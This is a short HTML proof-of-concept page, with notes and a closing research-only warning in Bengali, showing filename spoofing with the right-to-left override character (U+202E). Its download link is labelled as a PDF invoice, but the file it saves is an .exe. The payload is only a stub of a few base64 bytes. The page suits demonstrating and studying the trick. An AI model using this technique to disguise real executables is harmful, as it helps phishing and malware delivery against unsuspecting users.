<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Filename Spoofing PoC</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
        .download-btn {
            padding: 15px 25px;
            background-color: #007bff;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <h2>Filename Spoofing via RLO (U+202E)</h2>
    <p>নিচের লিঙ্কে ক্লিক করলে ফাইলটি <b>Invoice_2024exe.pdf</b> নামে ডাউনলোড হওয়ার কথা (visually),<br> 
    কিন্তু আসলে এটি একটি <b>.exe</b> ফাইল হিসেবে সেভ হবে।</p>

    <br><br>

    <!-- 
        ব্যাখ্যা: 
        &#x202E; হলো RLO ক্যারেক্টার। 
        এটি 'fdp.exe' কে উল্টে দিয়ে 'exe.pdf' হিসেবে দেখাবে। 
    -->
    <a href="data:application/octet-stream;base64,TVpQAA==" 
       download="Invoice_2024&#x202E;fdp.exe" 
       class="download-btn">
       Download Invoice (PDF)
    </a>

    <p style="margin-top: 30px; color: red;">
        সতর্কতা: এটি শুধুমাত্র গবেষণার উদ্দেশ্যে। কোনো সিস্টেমে ক্ষতি করার জন্য এটি ব্যবহার করবেন না।
    </p>

</body>
</html>
